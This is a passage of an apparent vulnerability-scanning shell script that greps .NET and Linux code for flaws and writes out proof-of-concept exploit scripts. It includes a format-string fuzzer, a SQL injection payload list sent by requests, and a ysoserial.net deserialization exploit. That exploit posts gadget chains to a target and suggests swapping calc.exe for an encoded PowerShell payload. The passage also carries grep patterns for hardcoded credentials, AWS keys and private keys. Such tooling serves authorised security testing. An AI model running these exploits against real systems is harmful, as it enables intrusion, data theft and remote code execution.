for payload in test_payloads:
    try:
        io = process(binary)
        io.recvuntil(b":")  # adjust to prompt
        io.sendline(payload)
        out = io.recvall(timeout=2)
        if b"0x" in out or b"ffff" in out.lower():
            print(f"[!] FORMAT STRING confirmed with: {payload}")
            print(out.decode(errors='replace'))
        io.close()
    except:
        pass

# To write to arbitrary address:
# from pwnlib.fmtstr import fmtstr_payload
# payload = fmtstr_payload(offset, {target_addr: value})
PYTHON_EOF
      chmod +x "$OUTPUT_ABS/poc-fmt-string.py"
      log "[+] Generated: poc-fmt-string.py"
      rpt "**PoC**: \`poc-fmt-string.py\` — Format string exploitation"
      rpt ""
    fi
  fi

  log ""
  ok "Linux ELF scan complete"
}

# ═══════════════════════════════════════════════════════════════════════════════
# .NET / WINDOWS PoC GENERATION
# ═══════════════════════════════════════════════════════════════════════════════
poc_dotnet() {
  log "=== .NET Vulnerability Scan ==="
  rpt "## .NET Findings"
  rpt ""

  local src="$SCAN_TARGET"

  # ── SQL Injection ─────────────────────────────────────────────────────────
  log "--- SQL Injection Scan ---"
  local sqli_hits
  sqli_hits=$(grep -rn --include="*.cs" \
    -E '(SqlCommand\s*\(\s*["\047].*\+|OleDbCommand\s*\(\s*["\047].*\+|ExecuteNonQuery|ExecuteReader|"SELECT.*\+|string\.Format.*SELECT|string\.Concat.*WHERE)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$sqli_hits" ]]; then
    rpt "### [CRITICAL] SQL Injection"
    rpt '```'
    echo "$sqli_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "CRITICAL"

    cat > "$OUTPUT_ABS/poc-sqli.py" <<PYTHON_EOF
#!/usr/bin/env python3
"""
SQL Injection PoC — .NET application
Generated by universal-re-skill vuln-poc.sh

Update TARGET_URL and PARAM_NAME for the actual endpoint.
"""

import requests
import sys

TARGET_URL = "http://target.local/api/endpoint"  # <-- Update
PARAM_NAME  = "id"                                  # <-- Update
HEADERS = {"Content-Type": "application/json"}

# SQL injection test payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "1; SELECT @@version--",
    "1; SELECT table_name FROM information_schema.tables--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",  # time-based blind
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

for payload in PAYLOADS:
    try:
        r = requests.get(TARGET_URL, params={PARAM_NAME: payload}, timeout=10)
        if any(kw in r.text.lower() for kw in ["sql", "syntax", "odbc", "error", "exception"]):
            print(f"[!] SQLi CONFIRMED: {payload[:60]}")
            print(f"    Status: {r.status_code}  Length: {len(r.text)}")
        elif r.elapsed.total_seconds() > 4:
            print(f"[!] TIME-BASED SQLi: {payload[:60]}")
        else:
            print(f"[-] {payload[:40]} → {r.status_code}")
    except Exception as e:
        print(f"[ERR] {e}")
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-sqli.py"
    log "[+] Generated: poc-sqli.py"
    rpt "**PoC**: \`poc-sqli.py\` — SQL injection testing"
    rpt ""
  fi

  # ── Unsafe deserialization ────────────────────────────────────────────────
  log "--- Deserialization Check ---"
  local deser_hits
  deser_hits=$(grep -rn --include="*.cs" \
    -E '(BinaryFormatter|NetDataContractSerializer|ObjectStateFormatter|LosFormatter|FastJSON|TypeNameHandling\.(All|Objects|Arrays|Auto))' \
    "$src" 2>/dev/null || true)

  if [[ -n "$deser_hits" ]]; then
    rpt "### [CRITICAL] Unsafe Deserialization"
    rpt '```'
    echo "$deser_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "CRITICAL"

    cat > "$OUTPUT_ABS/poc-deserialization.py" <<'PYTHON_EOF'
#!/usr/bin/env python3
"""
.NET Unsafe Deserialization PoC
Generated by universal-re-skill vuln-poc.sh

Uses ysoserial.net gadget chains. Install:
  https://github.com/pwntester/ysoserial.net

Gadget chains for BinaryFormatter: TypeConfuseDelegate, ObjectDataProvider, etc.
"""

import subprocess, base64, requests, sys

# ysoserial.net must be in PATH or YSOSERIAL path set
YSOSERIAL = "ysoserial"  # or "mono /path/to/ysoserial.exe"

# Command to execute on target
CMD = "calc.exe"  # change to actual payload (e.g., "powershell.exe -e <b64cmd>")

# Gadget chains to try
GADGETS = [
    "TypeConfuseDelegate",
    "ObjectDataProvider",
    "WindowsClaimsIdentity",
    "ActivitySurrogateSelector",
]

FORMATTERS = ["BinaryFormatter", "NetDataContractSerializer", "LosFormatter"]

for gadget in GADGETS:
    for fmt in FORMATTERS:
        try:
            result = subprocess.run(
                [YSOSERIAL, "-g", gadget, "-f", fmt, "-c", CMD, "-o", "base64"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                payload_b64 = result.stdout.strip()
                print(f"[+] Generated {fmt}/{gadget} payload ({len(payload_b64)} bytes base64)")

                # Send to target endpoint (update URL and parameter)
                TARGET = "http://target.local/api/deserialize"
                r = requests.post(TARGET,
                    data=payload_b64,
                    headers={"Content-Type": "application/octet-stream"},
                    timeout=10)
                print(f"    Response: {r.status_code} ({len(r.text)} bytes)")
        except FileNotFoundError:
            print(f"[!] ysoserial not found. Download: https://github.com/pwntester/ysoserial.net")
            break
        except Exception as e:
            print(f"[-] {gadget}/{fmt}: {e}")
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-deserialization.py"
    log "[+] Generated: poc-deserialization.py"
    rpt "**PoC**: \`poc-deserialization.py\` — Unsafe deserialization PoC"
    rpt ""
  fi

  # ── Hardcoded secrets scan ────────────────────────────────────────────────
  log "--- Hardcoded Secrets Scan ---"
  local secrets
  secrets=$(grep -rn --include="*.cs" --include="*.config" --include="*.json" \
    -E '(password\s*=\s*["\047][^\047"]{4,}|connectionString.*[Pp]assword=[^\047";]{4,}|api[_-]?key\s*=\s*["\047][^\047"]{8,}|AKIA[0-9A-Z]{16}|-----BEGIN.*PRIVATE KEY)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$secrets" ]]; then
    rpt "### [CRITICAL] Hardcoded Credentials"
    rpt '```'
    echo "$secrets" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "CRITICAL"
    log "[!] Hardcoded secrets found"
  fi

  # ── LDAP / Command injection ──────────────────────────────────────────────
  log "--- Injection Pattern Scan ---"
  local inject_hits
  inject_hits=$(grep -rn --include="*.cs" \
    -E '(Process\.Start\s*\(|ProcessStartInfo|Shell\s*\(|cmd\.exe|powershell.*-enc|DirectoryEntry.*LDAP|DirectorySearcher|string\.Format.*LDAP)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$inject_hits" ]]; then
    rpt "### [HIGH] Command / LDAP Injection Risk"
    rpt '```'
    echo "$inject_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "HIGH"
  fi

  log ""
  ok ".NET scan complete"
}

# ═══════════════════════════════════════════════════════════════════════════════
# DISPATCH
# ═══════════════════════════════════════════════════════════════════════════════
case "$PLATFORM" in
  android)          poc_android ;;
  linux)            poc_linux ;;
  dotnet|windows)   poc_dotnet; poc_linux 2>/dev/null || true ;;
  ios|macos)        poc_android ;;  # iOS uses similar Frida approach
  source|binary|*)  poc_linux; poc_dotnet 2>/dev/null || true ;;
esac

# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════
rpt "---"
rpt ""
rpt "## Summary"
rpt ""
rpt "| Severity | Count |"
rpt "|----------|-------|"
rpt "| CRITICAL | $CRITICAL |"
rpt "| HIGH     | $HIGH |"
rpt "| MEDIUM   | $MEDIUM |"
rpt "| LOW      | $LOW |"
rpt ""

# List generated PoC files
rpt "## Generated PoC Scripts"
rpt ""
while IFS= read -r f; do
  rpt "- [\`$(basename "$f")\`]($(basename "$f"))"
done < <(find "$OUTPUT_ABS" -maxdepth 1 -type f \( -name "poc-*" -o -name "*.html" \) 2>/dev/null | sort)
rpt ""
rpt "_Full scan log: \`$LOG\`_"

log ""
log "=== Scan Complete ==="
log "Report:   $REPORT"
log "Notes:    $NOTES"
log "Critical: $CRITICAL  High: $HIGH  Medium: $MEDIUM  Low: $LOW"
log ""
log "Generated PoC scripts:"
find "$OUTPUT_ABS" -maxdepth 1 -type f \( -name "poc-*" -o -name "*.html" \) 2>/dev/null | sort | while IFS= read -r f; do
  log "  → $(basename "$f")"
done
